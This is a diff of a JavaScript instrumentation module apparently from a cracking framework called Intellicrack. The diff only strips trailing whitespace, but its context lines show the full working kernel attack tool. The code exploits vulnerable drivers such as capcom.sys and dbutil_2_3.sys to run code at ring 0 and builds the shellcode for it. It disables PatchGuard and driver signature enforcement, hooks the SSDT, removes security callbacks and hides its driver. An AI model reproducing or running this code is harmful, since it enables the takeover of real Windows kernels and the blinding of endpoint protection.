@@ -18,10 +18,10 @@
 
 /**
  * Kernel Bridge
- * 
+ *
  * Advanced kernel-level integration for bypassing user-mode detection
  * and implementing ring-0 hooks through vulnerable driver exploitation.
- * 
+ *
  * Author: Intellicrack Framework
  * Version: 1.0.0
  * License: GPL v3
@@ -31,7 +31,7 @@
     name: "Kernel Bridge",
     description: "Kernel-level bypass through vulnerable driver exploitation",
     version: "1.0.0",
-    
+
     // Configuration
     config: {
         // Vulnerable drivers to exploit
@@ -67,7 +67,7 @@
                 enabled: true
             }
         },
-        
+
         // Target hooks
         hooks: {
             ssdt: {
@@ -90,14 +90,14 @@
                 ci: true
             }
         },
-        
+
         // PatchGuard bypass
         patchGuard: {
             method: "exception_hook", // exception_hook, timer_disable, context_swap
             disableKpp: true,
             disableDse: true
         },
-        
+
         // Stealth features
         stealth: {
             hideDriver: true,
@@ -106,7 +106,7 @@
             hypervisorDetection: true
         }
     },
-    
+
     // Runtime state
     driverHandle: null,
     kernelBase: null,
@@ -121,14 +121,14 @@
         callbacksBypassed: 0,
         patchGuardBypassed: false
     },
-    
+
     run: function() {
         send({
             type: "status",
             target: "kernel_bridge",
             action: "initializing_bridge"
         });
-        
+
         // Check platform
         if (Process.platform !== 'windows') {
             send({
@@ -139,7 +139,7 @@
         });
             return;
         }
-        
+
         // Check privileges
         if (!this.checkPrivileges()) {
             send({
@@ -149,10 +149,10 @@
             });
             return;
         }
-        
+
         // Find vulnerable driver
         this.findVulnerableDriver();
-        
+
         if (!this.driverHandle) {
             send({
                 type: "error",
@@ -161,30 +161,30 @@
             });
             return;
         }
-        
+
         // Get kernel addresses
         this.resolveKernelAddresses();
-        
+
         // Bypass PatchGuard
         if (this.config.patchGuard.disableKpp) {
             this.bypassPatchGuard();
         }
-        
+
         // Install kernel hooks
         this.installKernelHooks();
-        
+
         // Hide presence
         if (this.config.stealth.hideDriver) {
             this.hideFromDetection();
         }
-        
+
         send({
             type: "success",
             target: "kernel_bridge",
             action: "kernel_bridge_active"
         });
     },
-    
+
     // Check privileges
     checkPrivileges: function() {
         try {
@@ -193,24 +193,24 @@
                 return new NativeFunction(isAdmin, 'bool', [])();
             }
         } catch(e) {}
-        
+
         return false;
     },
-    
+
     // Find vulnerable driver
     findVulnerableDriver: function() {
         var self = this;
-        
+
         send({
             type: "status",
             target: "kernel_bridge",
             action: "searching_vulnerable_drivers"
         });
-        
+
         Object.keys(this.config.drivers).forEach(function(key) {
             var driver = self.config.drivers[key];
             if (!driver.enabled) return;
-            
+
             // Try to open device
             var handle = self.openDevice(driver.device);
             if (handle && handle.toInt32() !== -1) {
@@ -226,13 +226,13 @@
                 return;
             }
         });
-        
+
         // If no driver found, try to load one
         if (!this.driverHandle) {
             this.loadVulnerableDriver();
         }
     },
-    
+
     // Open device
     openDevice: function(deviceName) {
         var createFile = new NativeFunction(
@@ -240,9 +240,9 @@
             'pointer',
             ['pointer', 'uint32', 'uint32', 'pointer', 'uint32', 'uint32', 'pointer']
         );
-        
+
         var devicePath = Memory.allocUtf16String(deviceName);
-        
+
         return createFile(
             devicePath,
             0xC0000000, // GENERIC_READ | GENERIC_WRITE
@@ -253,31 +253,31 @@
             ptr(0)      // No template
         );
     },
-    
+
     // Load vulnerable driver
     loadVulnerableDriver: function() {
         var self = this;
-        
+
         send({
             type: "status",
             target: "kernel_bridge",
             action: "attempting_to_load_vulnerable_driver"
         });
-        
+
         // Drop driver to temp
         var tempPath = this.getTempPath() + "\\driver.sys";
         this.dropDriver(tempPath);
-        
+
         // Create service
         var scManager = this.openSCManager();
         if (!scManager) return;
-        
+
         var service = this.createDriverService(scManager, tempPath);
         if (!service) {
             this.closeSCManager(scManager);
             return;
         }
-        
+
         // Start service
         if (this.startDriverService(service)) {
             send({
@@ -285,17 +285,17 @@
                 target: "kernel_bridge",
                 action: "driver_loaded_successfully"
             });
-            
+
             // Try to open device again
             setTimeout(function() {
                 self.findVulnerableDriver();
             }, 1000);
         }
-        
+
         this.closeServiceHandle(service);
         this.closeSCManager(scManager);
     },
-    
+
     // Resolve kernel addresses
     resolveKernelAddresses: function() {
         send({
@@ -303,11 +303,11 @@
             target: "kernel_bridge",
             action: "resolving_kernel_addresses"
         });
-        
+
         // Get kernel base addresses
         this.ntoskrnlBase = this.getKernelModuleBase("ntoskrnl.exe");
         this.win32kBase = this.getKernelModuleBase("win32k.sys");
-        
+
         send({
             type: "info",
             target: "kernel_bridge",
@@ -322,7 +322,7 @@
             module: "win32k.sys",
             address: this.win32kBase.toString()
         });
-        
+
         // Find SSDT
         this.ssdtAddress = this.findSSDT();
         send({
@@ -331,15 +331,15 @@
             action: "ssdt_address_resolved",
             address: this.ssdtAddress.toString()
         });
-        
+
         // Find important functions
         this.resolveCriticalFunctions();
     },
-    
+
     // Get kernel module base
     getKernelModuleBase: function(moduleName) {
         var self = this;
-        
+
         // Use NtQuerySystemInformation
         var ntdll = Process.getModuleByName("ntdll.dll");
         var NtQuerySystemInformation = new NativeFunction(
@@ -347,86 +347,86 @@
             'uint32',
             ['uint32', 'pointer', 'uint32', 'pointer']
         );
-        
+
         // SystemModuleInformation = 11
         var size = 0x10000;
         var buffer = Memory.alloc(size);
         var returnLength = Memory.alloc(4);
-        
+
         var status = NtQuerySystemInformation(11, buffer, size, returnLength);
-        
+
         if (status === 0) {
             var count = buffer.readU32();
             var modules = buffer.add(8);
-            
+
             for (var i = 0; i < count; i++) {
                 var entry = modules.add(i * 0x128); // sizeof(RTL_PROCESS_MODULE_INFORMATION)
                 var imageName = entry.add(0x8).readCString();
-                
+
                 if (imageName.toLowerCase().includes(moduleName.toLowerCase())) {
                     return entry.add(0x18).readPointer();
                 }
             }
         }
-        
+
         return null;
     },
-    
+
     // Find SSDT
     findSSDT: function() {
         if (!this.ntoskrnlBase) return null;
-        
+
         // Search for KeServiceDescriptorTable pattern
         var pattern = "4C 8D 15 ?? ?? ?? ?? 4C 8D 1D ?? ?? ?? ?? F7";
         var result = this.searchKernelPattern(this.ntoskrnlBase, pattern);
-        
+
         if (result) {
             // Calculate SSDT address from RIP-relative addressing
             var offset = result.add(3).readS32();
             return result.add(7).add(offset);
         }
-        
+
         return null;
     },
-    
+
     // Bypass PatchGuard
     bypassPatchGuard: function() {
         var self = this;
-        
+
         send({
             type: "status",
             target: "kernel_bridge",
             action: "bypassing_patchguard"
         });
-        
+
         switch(this.config.patchGuard.method) {
             case "exception_hook":
                 this.bypassPGViaExceptionHook();
                 break;
-                
+
             case "timer_disable":
                 this.bypassPGViaTimerDisable();
                 break;
-                
+
             case "context_swap":
                 this.bypassPGViaContextSwap();
                 break;
         }
-        
+
         // Disable Driver Signature Enforcement
         if (this.config.patchGuard.disableDse) {
             this.disableDSE();
         }
-        
+
         this.stats.patchGuardBypassed = true;
     },
-    
+
     // Bypass PatchGuard via exception hook
     bypassPGViaExceptionHook: function() {
         // Hook KeBugCheckEx
         var keBugCheckEx = this.getKernelExport("KeBugCheckEx");
         if (!keBugCheckEx) return;
-        
+
         // Generate shellcode to filter PatchGuard bug checks
         var shellcode = [
             0x48, 0x83, 0xEC, 0x28,                     // sub rsp, 28h
@@ -442,7 +442,7 @@
             0xC3                                        // ret
             // end:
         ];
-        
+
         this.installKernelHook(keBugCheckEx, shellcode);
         send({
             type: "success",
@@ -450,24 +450,24 @@
             action: "patchguard_exception_hook_installed"
         });
     },
-    
+
     // Disable Driver Signature Enforcement
     disableDSE: function() {
         // Find g_CiOptions
         var ciBase = this.getKernelModuleBase("ci.dll");
         if (!ciBase) return;
-        
+
         // Search for g_CiOptions pattern
         var pattern = "89 ?? ?? ?? ?? ?? 40 84 FF 0F 84";
         var result = this.searchKernelPattern(ciBase, pattern);
-        
+
         if (result) {
             var g_CiOptions = result.add(2).readPointer();
-            
+
             // Clear DSE bits
             var currentValue = this.readKernelMemory(g_CiOptions, 4).readU32();
             var newValue = currentValue & ~0x6; // Clear bits 1 and 2
-            
+
             this.writeKernelMemory(g_CiOptions, newValue);
             send({
                 type: "bypass",
@@ -476,73 +476,73 @@
             });
         }
     },
-    
+
     // Install kernel hooks
     installKernelHooks: function() {
         var self = this;
-        
+
         send({
             type: "status",
             target: "kernel_bridge",
             action: "installing_kernel_hooks"
         });
-        
+
         // SSDT hooks
         if (this.ssdtAddress) {
             this.installSSDTHooks();
         }
-        
+
         // Callback hooks
         this.installCallbackHooks();
-        
+
         // Inline hooks
         this.installInlineHooks();
-        
+
         // IRP hooks
         this.installIRPHooks();
     },
-    
+
     // Install SSDT hooks
     installSSDTHooks: function() {
         var self = this;
-        
+
         if (!this.ssdtAddress) return;
-        
+
         send({
             type: "status",
             target: "kernel_bridge",
             action: "installing_ssdt_hooks"
         });
-        
+
         Object.keys(this.config.hooks.ssdt).forEach(function(syscall) {
             if (!self.config.hooks.ssdt[syscall]) return;
-            
+
             var index = self.getSyscallIndex(syscall);
             if (index === -1) return;
-            
+
             // Read current SSDT entry
             var entry = self.readKernelMemory(self.ssdtAddress.add(index * 4), 4);
             var offset = entry.readS32();
             var originalFunc = self.ssdtAddress.add(offset >> 4);
-            
+
             // Generate hook shellcode
             var hookShellcode = self.generateSSDTHook(syscall, originalFunc);
-            
+
             // Allocate kernel memory for hook
             var hookAddr = self.allocateKernelMemory(hookShellcode.length);
             self.writeKernelMemory(hookAddr, hookShellcode);
-            
+
             // Calculate new offset
             var newOffset = (hookAddr.sub(self.ssdtAddress).toInt32() << 4) | (offset & 0xF);
-            
+
             // Update SSDT
             self.writeKernelMemory(self.ssdtAddress.add(index * 4), newOffset);
-            
+
             self.hooks[syscall] = {
                 original: originalFunc,
                 hook: hookAddr
             };
-            
+
             self.stats.hooksInstalled++;
             send({
                 type: "success",
@@ -552,7 +552,7 @@
             });
         });
     },
-    
+
     // Get syscall index
     getSyscallIndex: function(syscallName) {
         // Syscall indices for Windows 10/11
@@ -564,14 +564,14 @@
             "NtReadVirtualMemory": 0x3F,
             "NtWriteVirtualMemory": 0x3A
         };
-        
+
         return indices[syscallName] || -1;
     },
-    
+
     // Generate SSDT hook shellcode
     generateSSDTHook: function(syscall, original) {
         var self = this;
-        
+
         // Generic hook template
         var hook = [
             // Save registers
@@ -579,79 +579,79 @@
             0x48, 0x89, 0x54, 0x24, 0x10,     // mov [rsp+10h], rdx
             0x4C, 0x89, 0x44, 0x24, 0x18,     // mov [rsp+18h], r8
             0x4C, 0x89, 0x4C, 0x24, 0x20,     // mov [rsp+20h], r9
-            
+
             // Call our handler
             0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, handler
             0xFF, 0xD0,                         // call rax
-            
+
             // Check if we should block
             0x48, 0x85, 0xC0,                   // test rax, rax
             0x75, 0x1C,                         // jnz block
-            
+
             // Restore registers and call original
             0x48, 0x8B, 0x4C, 0x24, 0x08,     // mov rcx, [rsp+8]
             0x48, 0x8B, 0x54, 0x24, 0x10,     // mov rdx, [rsp+10h]
             0x4C, 0x8B, 0x44, 0x24, 0x18,     // mov r8, [rsp+18h]
             0x4C, 0x8B, 0x4C, 0x24, 0x20,     // mov r9, [rsp+20h]
-            
+
             0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, original
             0xFF, 0xE0,                         // jmp rax
-            
+
             // block:
             0x48, 0x31, 0xC0,                   // xor rax, rax (STATUS_SUCCESS)
             0xC3                                // ret
         ];
-        
+
         // Patch addresses
         var handlerAddr = this.getHandlerAddress(syscall);
         for (var i = 0; i < 8; i++) {
             hook[16 + i] = (handlerAddr >> (i * 8)) & 0xFF;
         }
-        
+
         for (var i = 0; i < 8; i++) {
             hook[48 + i] = (original >> (i * 8)) & 0xFF;
         }
-        
+
         return hook;
     },
-    
+
     // Install callback hooks
     installCallbackHooks: function() {
         var self = this;
-        
+
         send({
             type: "status",
             target: "kernel_bridge",
             action: "installing_callback_hooks"
         });
-        
+
         // Process creation callback
         if (this.config.hooks.callbacks.processNotify) {
             this.removeProcessCallbacks();
         }
-        
+
         // Thread creation callback
         if (this.config.hooks.callbacks.threadNotify) {
             this.removeThreadCallbacks();
         }
-        
+
         // Image load callback
         if (this.config.hooks.callbacks.imageNotify) {
             this.removeImageCallbacks();
         }
-        
+
         // Registry callback
         if (this.config.hooks.callbacks.registryCallback) {
             this.removeRegistryCallbacks();
         }
     },
-    
+
     // Remove process callbacks
     removeProcessCallbacks: function() {
         // Find PspCreateProcessNotifyRoutine array
         var pspRoutines = this.findPspCreateProcessNotifyRoutine();
         if (!pspRoutines) return;
-        
+
         // Clear all callbacks
         for (var i = 0; i < 64; i++) {
             var entry = this.readKernelMemory(pspRoutines.add(i * 8), 8);
@@ -660,24 +660,24 @@
                 this.stats.callbacksBypassed++;
             }
         }
-        
+
         send({
             type: "success",
             target: "kernel_bridge",
             action: "process_callbacks_removed"
         });
     },
-    
+
     // Install inline hooks
     installInlineHooks: function() {
         var self = this;
-        
+
         send({
             type: "status",
             target: "kernel_bridge",
             action: "installing_inline_hooks"
         });
-        
+
         // Hook critical functions
         var targets = [
             { module: "ntoskrnl.exe", function: "ObRegisterCallbacks" },
@@ -686,7 +686,7 @@
             { module: "ntoskrnl.exe", function: "ExAllocatePoolWithTag" },
             { module: "ntoskrnl.exe", function: "MmGetSystemRoutineAddress" }
         ];
-        
+
         targets.forEach(function(target) {
             var funcAddr = self.getKernelExport(target.function);
             if (funcAddr) {
@@ -694,7 +694,7 @@
             }
         });
     },
-    
+
     // Install inline hook
     installInlineHook: function(target, name) {
         // Generate trampoline
@@ -702,17 +702,17 @@
             0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, hook
             0xFF, 0xE0  // jmp rax
         ];
-        
+
         // Allocate hook function
         var hookFunc = this.allocateKernelMemory(0x1000);
         var hookCode = this.generateInlineHookCode(target, name);
         this.writeKernelMemory(hookFunc, hookCode);
-        
+
         // Patch trampoline
         for (var i = 0; i < 8; i++) {
             trampoline[2 + i] = (hookFunc >> (i * 8)) & 0xFF;
         }
-        
+
         // Save original bytes
         var originalBytes = this.readKernelMemory(target, 12);
         this.hooks[name] = {
@@ -720,10 +720,10 @@
             original: originalBytes,
             hook: hookFunc
         };
-        
+
         // Install hook
         this.writeKernelMemory(target, trampoline);
-        
+
         this.stats.hooksInstalled++;
         send({
                 type: "success",
@@ -732,75 +732,75 @@
                 function_name: name
             });
     },
-    
+
     // Hide from detection
     hideFromDetection: function() {
         var self = this;
-        
+
         send({
             type: "status",
             target: "kernel_bridge",
             action: "hiding_kernel_modifications"
         });
-        
+
         // Hide driver
         if (this.config.stealth.hideDriver) {
             this.hideDriverObject();
         }
-        
+
         // Hide hooks
         if (this.config.stealth.hideHooks) {
             this.implementHookStealth();
         }
-        
+
         // Anti-forensics
         if (this.config.stealth.antiForensics) {
             this.implementAntiForensics();
         }
-        
+
         // Hypervisor detection
         if (this.config.stealth.hypervisorDetection) {
             this.detectHypervisor();
         }
     },
-    
+
     // Hide driver object
     hideDriverObject: function() {
         // Find our driver object
         var driverObject = this.findDriverObject();
         if (!driverObject) return;
-        
+
         // Unlink from driver list
         var listEntry = driverObject.add(0x48); // DriverSection
         var flink = this.readKernelMemory(listEntry, 8);
         var blink = this.readKernelMemory(listEntry.add(8), 8);
-        
+
         // Unlink
         this.writeKernelMemory(blink.add(0), flink);
         this.writeKernelMemory(flink.add(8), blink);
-        
+
         // Clear driver object fields
         this.writeKernelMemory(driverObject.add(0x28), ptr(0)); // DriverName
         this.writeKernelMemory(driverObject.add(0x38), ptr(0)); // HardwareDatabase
-        
+
         send({
             type: "bypass",
             target: "kernel_bridge",
             action: "driver_hidden_from_object_manager"
         });
     },
-    
+
     // Implement hook stealth
     implementHookStealth: function() {
         var self = this;
-        
+
         // Hook memory read functions to hide our modifications
         var targets = [
             "MmCopyVirtualMemory",
             "MmCopyMemory",
             "RtlCopyMemory"
         ];
-        
+
         targets.forEach(function(func) {
             var addr = self.getKernelExport(func);
             if (addr) {
@@ -808,22 +808,22 @@
             }
         });
     },
-    
+
     // Execute in kernel
     executeInKernel: function(shellcode) {
         if (!this.driverHandle || !this.currentDriver) return null;
-        
+
         var deviceIoControl = new NativeFunction(
             Module.findExportByName("kernel32.dll", "DeviceIoControl"),
             'bool',
             ['pointer', 'uint32', 'pointer', 'uint32', 'pointer', 'uint32', 'pointer', 'pointer']
         );
-        
+
         // Prepare input buffer based on driver type
         var inputBuffer = this.prepareKernelPayload(shellcode);
         var outputBuffer = Memory.alloc(0x1000);
         var bytesReturned = Memory.alloc(4);
-        
+
         var result = deviceIoControl(
             this.driverHandle,
             this.currentDriver.ioctl,
@@ -834,47 +834,47 @@
             bytesReturned,
             ptr(0)
         );
-        
+
         if (result) {
             return outputBuffer.readPointer();
         }
-        
+
         return null;
     },
-    
+
     // Prepare kernel payload
     prepareKernelPayload: function(shellcode) {
         var self = this;
-        
+
         // Different drivers have different input structures
         switch(this.currentDriver.name) {
             case "capcom.sys":
                 return this.prepareCapcomPayload(shellcode);
-                
+
             case "dbutil_2_3.sys":
                 return this.prepareDBUtilPayload(shellcode);
-                
+
             case "cpuz141.sys":
                 return this.prepareCPUZPayload(shellcode);
-                
+
             default:
                 return shellcode;
         }
     },
-    
+
     // Prepare Capcom payload
     prepareCapcomPayload: function(shellcode) {
-        // Capcom expects: 
+        // Capcom expects:
         // +0x00: Pointer to function
         // +0x08: Argument
-        
+
         var payload = Memory.alloc(0x10);
         payload.writePointer(shellcode);
         payload.add(8).writePointer(ptr(0));
-        
+
         return payload;
     },
-    
+
     // Read kernel memory
     readKernelMemory: function(address, size) {
         var shellcode = [
@@ -883,15 +883,15 @@
             0x48, 0x8B, 0x00,       // mov rax, [rax]
             0xC3                    // ret
         ];
-        
+
         // Allocate and execute
         var code = Memory.alloc(shellcode.length);
         code.writeByteArray(shellcode);
-        
+
         var result = this.executeInKernel(code);
         return result;
     },
-    
+
     // Write kernel memory
     writeKernelMemory: function(address, data) {
         var shellcode = [
@@ -900,19 +900,19 @@
             0x48, 0x89, 0x08,       // mov [rax], rcx
             0xC3                    // ret
         ];
-        
+
         // Allocate and execute
         var code = Memory.alloc(shellcode.length);
         code.writeByteArray(shellcode);
-        
+
         this.executeInKernel(code);
     },
-    
+
     // Allocate kernel memory
     allocateKernelMemory: function(size) {
         var exAllocatePool = this.getKernelExport("ExAllocatePoolWithTag");
         if (!exAllocatePool) return null;
-        
+
         var shellcode = [
             0x48, 0x83, 0xEC, 0x28,     // sub rsp, 28h
             0x48, 0xC7, 0xC1, 0x00, 0x00, 0x00, 0x00, // mov rcx, 0 (NonPagedPool)
@@ -923,39 +923,39 @@
             0x48, 0x83, 0xC4, 0x28,     // add rsp, 28h
             0xC3                        // ret
         ];
-        
+
         // Patch size
         for (var i = 0; i < 8; i++) {
             shellcode[11 + i] = (size >> (i * 8)) & 0xFF;
         }
-        
+
         // Patch function address
         for (var i = 0; i < 8; i++) {
             shellcode[25 + i] = (exAllocatePool >> (i * 8)) & 0xFF;
         }
-        
+
         var code = Memory.alloc(shellcode.length);
         code.writeByteArray(shellcode);
-        
+
         return this.executeInKernel(code);
     },
-    
+
     // Get kernel export
     getKernelExport: function(functionName) {
         if (!this.ntoskrnlBase) return null;
-        
+
         // Use MmGetSystemRoutineAddress
         var mmGetSystemRoutineAddress = this.findMmGetSystemRoutineAddress();
         if (!mmGetSystemRoutineAddress) return null;
-        
+
         // Create UNICODE_STRING
         var unicodeString = Memory.alloc(16);
         var nameBuffer = Memory.allocUtf16String(functionName);
-        
+
         unicodeString.writeU16(functionName.length * 2);
         unicodeString.add(2).writeU16(functionName.length * 2);
         unicodeString.add(8).writePointer(nameBuffer);
-        
+
         var shellcode = [
             0x48, 0x83, 0xEC, 0x28,     // sub rsp, 28h
             0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rcx, unicodeString
@@ -964,19 +964,19 @@
             0x48, 0x83, 0xC4, 0x28,     // add rsp, 28h
             0xC3                        // ret
         ];
-        
+
         // Patch addresses
         for (var i = 0; i < 8; i++) {
             shellcode[6 + i] = (unicodeString >> (i * 8)) & 0xFF;
             shellcode[16 + i] = (mmGetSystemRoutineAddress >> (i * 8)) & 0xFF;
         }
-        
+
         var code = Memory.alloc(shellcode.length);
         code.writeByteArray(shellcode);
-        
+
         return this.executeInKernel(code);
     },
-    
+
     // Statistics
     getStatistics: function() {
         return {
